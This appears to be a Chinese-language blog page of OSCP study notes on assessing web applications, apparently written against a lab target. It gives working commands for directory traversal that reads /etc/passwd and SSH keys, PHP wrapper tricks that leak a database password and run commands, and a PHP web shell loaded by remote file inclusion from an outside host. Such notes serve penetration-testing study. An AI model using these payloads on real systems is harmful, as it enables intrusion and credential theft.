@@ -1,0 +1,328 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OSCP-Web程序评估 | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="OSCP-Web程序评估 | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Web程序评估
+应用枚举
+Gobuster
+gobuster dir -u http://192.168.214.249/  -w /usr/share/wordlists/dirb/common.txt -q -n -e
+
+DIRB
+Bu..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              OSCP-Web程序评估
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-02-21
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web程序评估">Web程序评估</h1>
+<h2 id="应用枚举">应用枚举</h2>
+<h3 id="gobuster">Gobuster</h3>
+<pre><code>gobuster dir -u http://192.168.214.249/  -w /usr/share/wordlists/dirb/common.txt -q -n -e
+</code></pre>
+<h2 id="dirb">DIRB</h2>
+<h2 id="burp-suite">Burp Suite</h2>
+<h2 id="nikto">Nikto</h2>
+<h2 id="web漏洞">Web漏洞</h2>
+<h3 id="目录遍历">目录遍历</h3>
+<h4 id="linux">Linux</h4>
+<pre><code>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+</code></pre>
+<h4 id="windows">Windows</h4>
+<p>在Windows上，我们可以使用C:\Windows\System32\drivers\etc\hosts文件 来测试目录遍历漏洞</p>
+<pre><code>
+</code></pre>
+<h3 id="文件包含">文件包含</h3>
+<h4 id="本地文件包含lfi">本地文件包含（LFI）</h4>
+<p>在下面的案例研究中，我们将尝试将可执行代码写入/var/log/apache2/目录中的Apache的access.log文件。我们首先需要检查哪些信息是由我们控制并由 Apache 保存在相关日志中的。在这种情况下，“受控”意味着我们可以在将信息发送到 Web 应用程序之前对其进行修改。我们可以阅读 Apache Web 服务器文档或通过 LFI 显示该文件</p>
+<p>access.log</p>
+<ul>
+<li>可以记录我们可控字符串</li>
+<li>可以被文件包含</li>
+</ul>
+<p>access.log  会记录 User-Agent 信息</p>
+<pre><code>192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] &quot;GET /meteor/index.php?page=admin.php HTTP/1.1&quot; 200 2218 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;
+</code></pre>
+<p>构造恶意请求<br>
+<img src="https://blog.cxaqhq.cn/post-images/1694914242403.png" alt="" loading="lazy"></p>
+<p>利用<br>
+<img src="https://blog.cxaqhq.cn/post-images/1694914274623.png" alt="" loading="lazy"></p>
+<h4 id="php">PHP</h4>
+<h5 id="phpfilter">php://filter</h5>
+<pre><code>curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+...
+&lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+...
+
+
+echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Maintenance&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+        &lt;?php echo '&lt;span style=&quot;color:#F00;text-align:center;&quot;&gt;The admin page is currently under maintenance.'; ?&gt;
+
+&lt;?php
+$servername = &quot;localhost&quot;;
+$username = &quot;root&quot;;
+$password = &quot;M00nK4keCard!2#&quot;;
+
+// Create connection
+$conn = new mysqli($servername, $username, $password);
+...
+</code></pre>
+<h5 id="data">data</h5>
+<pre><code>kali@kali:~$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;&quot;
+...
+&lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+</code></pre>
+<h4 id="远程文件包含rfi">远程文件包含（RFI）</h4>
+<p>需要启用allowed_url_include选项才能利用 RFI</p>
+<p>恶意php文件内容及利用方法</p>
+<pre><code>kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+...
+&lt;?php
+if(isset($_REQUEST['cmd'])){
+        echo &quot;&lt;pre&gt;&quot;;
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo &quot;&lt;/pre&gt;&quot;;
+        die;
+}
+?&gt;
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+...
+</code></pre>
+<p>远程文件包含</p>
+<pre><code>kali@kali:/usr/share/webshells/php/$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
+...
+&lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
+&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt; 
+
+&lt;pre&gt;admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+&lt;/pre&gt;  
+</code></pre>
+<h3 id="文件上传">文件上传</h3>
+<h3 id="命令注入命令执行">命令注入（命令执行）</h3>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web%E7%A8%8B%E5%BA%8F%E8%AF%84%E4%BC%B0">Web程序评估</a>
+<ul>
+<li><a href="#%E5%BA%94%E7%94%A8%E6%9E%9A%E4%B8%BE">应用枚举</a>
+<ul>
+<li><a href="#gobuster">Gobuster</a></li>
+</ul>
+</li>
+<li><a href="#dirb">DIRB</a></li>
+<li><a href="#burp-suite">Burp Suite</a></li>
+<li><a href="#nikto">Nikto</a></li>
+<li><a href="#web%E6%BC%8F%E6%B4%9E">Web漏洞</a>
+<ul>
+<li><a href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">目录遍历</a>
+<ul>
+<li><a href="#linux">Linux</a></li>
+<li><a href="#windows">Windows</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
+<ul>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlfi">本地文件包含（LFI）</a></li>
+<li><a href="#php">PHP</a>
+<ul>
+<li><a href="#phpfilter">php://filter</a></li>
+<li><a href="#data">data</a></li>
+</ul>
+</li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrfi">远程文件包含（RFI）</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令注入（命令执行）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/oscp-lou-dong-sao-miao/">
+              <h3 class="post-title">
+                OSCP-漏洞扫描
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
